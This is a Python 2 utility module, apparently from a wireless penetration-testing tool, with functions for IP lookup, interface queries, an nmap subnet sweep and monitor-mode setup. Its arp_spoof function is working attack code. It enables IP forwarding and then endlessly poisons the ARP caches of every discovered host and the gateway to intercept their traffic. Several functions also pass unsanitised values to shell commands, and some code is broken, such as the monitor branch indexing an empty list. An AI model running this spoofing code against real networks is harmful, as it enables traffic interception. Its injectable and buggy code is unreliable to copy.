import fcntl
from libnmap.process import NmapProcess
from libnmap.parser import NmapParser, NmapParserException
from scapy.all import *
from subprocess import Popen, PIPE, call
from sys import stdout
logging.getLogger("scapy.runtime").setLevel(logging.WARNING)
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

__author__ = 'hackpupu'
import re
import random
import urllib2 as urllib
from ctypes import *


def myip():
    return IPgetter().get_externalip()


class Sockaddr(Structure):
    _fields_ = [('sa_family', c_ushort), ('sa_data', c_char * 14)]


class Ifa_Ifu(Union):
    _fields_ = [('ifu_broadaddr', POINTER(Sockaddr)),
                ('ifu_dstaddr', POINTER(Sockaddr))]


class Ifaddrs(Structure):
    pass

Ifaddrs._fields_ = [('ifa_next', POINTER(Ifaddrs)), ('ifa_name', c_char_p),
                    ('ifa_flags', c_uint), ('ifa_addr', POINTER(Sockaddr)),
                    ('ifa_netmask', POINTER(Sockaddr)), ('ifa_ifu', Ifa_Ifu),
                    ('ifa_data', c_void_p)]


class IPgetter(object):
    def __init__(self):
        self.server_list = ['http://ip.dnsexit.com',
                            'http://ifconfig.me/ip',
                            'http://ipecho.net/plain',
                            'http://checkip.dyndns.org/plain',
                            'http://ipogre.com/linux.php',
                            'http://whatismyipaddress.com/',
                            'http://ip.my-proxy.com/',
                            'http://websiteipaddress.com/WhatIsMyIp',
                            'http://getmyipaddress.org/',
                            'http://www.my-ip-address.net/',
                            'http://myexternalip.com/raw',
                            'http://www.canyouseeme.org/',
                            'http://www.trackip.net/',
                            'http://icanhazip.com/',
                            'http://www.iplocation.net/',
                            'http://www.howtofindmyipaddress.com/',
                            'http://www.ipchicken.com/',
                            'http://whatsmyip.net/',
                            'http://www.ip-adress.com/',
                            'http://checkmyip.com/',
                            'http://www.tracemyip.org/',
                            'http://checkmyip.net/',
                            'http://www.lawrencegoetz.com/programs/ipinfo/',
                            'http://www.findmyip.co/',
                            'http://ip-lookup.net/',
                            'http://www.dslreports.com/whois',
                            'http://www.mon-ip.com/en/my-ip/',
                            'http://www.myip.ru',
                            'http://ipgoat.com/',
                            'http://www.myipnumber.com/my-ip-address.asp',
                            'http://www.whatsmyipaddress.net/',
                            'http://formyip.com/',
                            'https://check.torproject.org/',
                            'http://www.displaymyip.com/',
                            'http://www.bobborst.com/tools/whatsmyip/',
                            'http://www.geoiptool.com/',
                            'https://www.whatsmydns.net/whats-my-ip-address.html',
                            'https://www.privateinternetaccess.com/pages/whats-my-ip/',
                            'http://checkip.dyndns.com/',
                            'http://myexternalip.com/',
                            'http://www.ip-adress.eu/',
                            'http://www.infosniper.net/',
                            'http://wtfismyip.com/',
                            'http://ipinfo.io/',
                            'http://httpbin.org/ip']

    def get_externalip(self):
        '''
        This function gets your IP from a random server
        '''

        myip = ''
        for i in range(7):
            myip = self.fetch(random.choice(self.server_list))
            if myip != '':
                return myip
            else:
                continue
        return ''

    def fetch(self, server):
        '''
        This function gets your IP from a specific server.
        '''
        url = None
        opener = urllib.build_opener()
        opener.addheaders = [('User-agent',
                              "Mozilla/5.0 (X11; Linux x86_64; rv:24.0) Gecko/20100101 Firefox/24.0")]

        try:
            url = opener.open(server, timeout=2)
            content = url.read()

            # Didn't want to import chardet. Prefered to stick to stdlib
            try:
                content = content.decode('UTF-8')
            except UnicodeDecodeError:
                content = content.decode('ISO-8859-1')

            m = re.search(
                '(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)',
                content)
            myip = m.group(0)
            return myip if len(myip) > 0 else ''
        except Exception:
            return ''
        finally:
            if url:
                url.close()


def get_mac_address(ifname):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    info = fcntl.ioctl(s.fileno(), 0x8927, struct.pack('256s', ifname[:15]))
    return ':'.join(['%02x' % ord(char) for char in info[18:24]])


def get_ip_address(ifname):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        return socket.inet_ntoa(fcntl.ioctl(s.fileno(), 0x8915, struct.pack('256s', ifname[:15]))[20:24])
    except IOError:
        return False


def get_l_gateway_ip(iface):
    command = 'nmcli dev list iface ' + iface + ' | grep IP4'
    p = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE)
    output, errors = p.communicate()
    ip_address = output[output.find("gw = ")+5:output.find("\n")]

    return ip_address


def get_l_gateway_mac(iface):
    command = '/usr/bin/arping -c 1 -I ' + iface + ' ' + get_l_gateway_ip(iface)
    p = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE)
    output, errors = p.communicate()
    if output is not None:
        mac_address = re.findall(r'(\[.*\])', output)[0].replace('[', '').replace(']', '')
        return mac_address
    else:
        return False


def get_remote_mac(iface, ipaddr):
    command = '/usr/bin/arping -c 1 -I ' + iface + ' ' + ipaddr
    p = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE)
    output, erros = p.communicate()
    if output is not None:
        try:
            mac_address = re.findall(r'(\[.*\])', output)[0].replace('[', '').replace(']', '')
            return mac_address
        except IndexError:
            return False
    else:
        return False


def network_host_ip(interface):
    # interface subnet mask calc
    subnet = socket.inet_ntoa(fcntl.ioctl(socket.socket(socket.AF_INET,
                                                        socket.SOCK_DGRAM),
                                          35099,
                                          struct.pack('256s', interface))[20:24])
    subnet = subnet.split('.')
    binary_str = ''
    for octet in subnet:
        binary_str += bin(int(octet))[2:].zfill(8)
    subnet = str(len(binary_str.rstrip('0')))
    # interface ip calc
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    ip = socket.inet_ntoa(fcntl.ioctl(
        s.fileno(),
        0x8915,
        struct.pack('256s', interface[:15])
    )[20:24])
    # Network Scan Start
    parser = None
    process = NmapProcess(targets=ip + '/' + subnet, options="-sP", event_callback=None, safe_mode=None, fqp=None)
    rc = process.run()
    if rc != 0:
        print("Network Scan Failed")

    try:
        parser = NmapParser.parse(process.stdout)
    except NmapParserException:
        print("Exception Network Error")
    up_hosts = []
    gateway = get_l_gateway_ip(interface)
    for host in parser.hosts:
        if str(host).find('up') is not -1:
            up_host = re.findall(r'(\[.*\()', str(host))[0].replace('[', '').replace(' (', '')
            up_hosts.append(up_host)
    up_hosts.remove(gateway)
    up_hosts.remove(ip)
    return up_hosts


def arp_spoof(iface):
    os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
    os.system('service whoopsie stop')
    victim_hosts = network_host_ip(iface)
    gateway_ip = get_l_gateway_ip(iface)
    while True:
        for victim_ip in victim_hosts:
            to_gateway = ARP()
            to_gateway.psrc = victim_ip
            to_gateway.pdst = gateway_ip
            to_victim = ARP()
            to_victim.psrc = gateway_ip
            to_victim.pdst = victim_ip
            send(to_victim, verbose=0)
            send(to_gateway, verbose=0)
            time.sleep(5)


def set_new_connection(ssid, pw, iface):
    delete = ["nmcli", "connection", "delete", "id", ssid]
    Popen(delete, stdout=PIPE).communicate()
    pw = str(pw).strip()
    new_conn = ["nmcli", "device", "wifi", "connect", ssid, "password", pw, 'ifname', iface]
    res = Popen(new_conn, stdout=PIPE).communicate()
    status = ["nmcli", "connection", "list", "id", ssid]
    active = Popen(status, stdout=PIPE).communicate()[0]
    # Delete connections with errors
    if "Error" in res and \
            ('activating' not in active or 'activated' not in active):
        delete = ["nmcli", "connection", "delete", ssid]
        Popen(delete, stdout=PIPE).communicate()
        return False
    else:
        return True


def print_and_exec(command):
    print '\r'
    stdout.flush()
    call(command, stdout=None, stderr=None)
    time.sleep(0.1)


def get_interfaces():
    libc = CDLL('libc.so.6')
    libc.getifaddrs.restype = c_int
    ifaddr_p = pointer(Ifaddrs())
    ret = libc.getifaddrs(pointer((ifaddr_p)))
    interfaces = set()
    head = ifaddr_p
    while ifaddr_p:
        interfaces.add(ifaddr_p.contents.ifa_name)
        ifaddr_p = ifaddr_p.contents.ifa_next
    libc.freeifaddrs(head)
    return interfaces


def auto_monitor():
    res = Popen('iw dev | grep phy#', shell=True, stdout=PIPE)
    interface_list = res.communicate()[0].split('\n')
    interface_list.pop()
    ap_support = []
    monitor_support = []
    for interface in interface_list:
        interface = interface.replace('#', '')
        res = Popen('iw dev ' + interface + ' info', shell=True, stdout=PIPE)
        info = res.communicate()[0]
        support_list = info[info.find('Supported interface modes')+27:info.find('Band 1:')].replace('\t', '').replace('\n', '').replace(' ', '').split('*')
        support_list = support_list[1:]
        for support in support_list:
            if support == 'AP':
                ap_support.append(interface)
            elif support == 'monitor':
                monitor_support.append(interface)

    if ap_support:
        res = Popen('iw dev ' + ap_support[0] + ' interface add atear_dump type monitor', shell=True, stdout=PIPE)
        res = Popen('iw dev ' + ap_support[0] + ' interface add atear_wids type monitor', shell=True, stdout=PIPE)
        res = Popen('iw dev ' + ap_support[0] + ' interface add atear_ap type monitor', shell=True, stdout=PIPE)
        res = Popen('iw dev ' + ap_support[0] + ' interface add atear_pentest type monitor', shell=True, stdout=PIPE)
        Popen('rfkill unblock all', shell=True)
    elif monitor_support:
        res = Popen('iw dev ' + ap_support[0] + ' interface add atear_dump type monitor', shell=True, stdout=PIPE)
        res = Popen('iw dev ' + ap_support[0] + ' interface add atear_wids type monitor', shell=True, stdout=PIPE)
        res = Popen('iw dev ' + ap_support[0] + ' interface add atear_ap type monitor', shell=True, stdout=PIPE)
        res = Popen('iw dev ' + ap_support[0] + ' interface add atear_pentest type monitor', shell=True, stdout=PIPE)
        Popen('rfkill unblock all')


def stop_monitor():
    Popen('iw dev atear_dump del', shell=True, stdout=PIPE)
    Popen('iw dev atear_wids del', shell=True, stdout=PIPE)
    Popen('iw dev atear_ap del', shell=True, stdout=PIPE)
    Popen('iw dev atear_pentest del', shell=True, stdout=PIPE)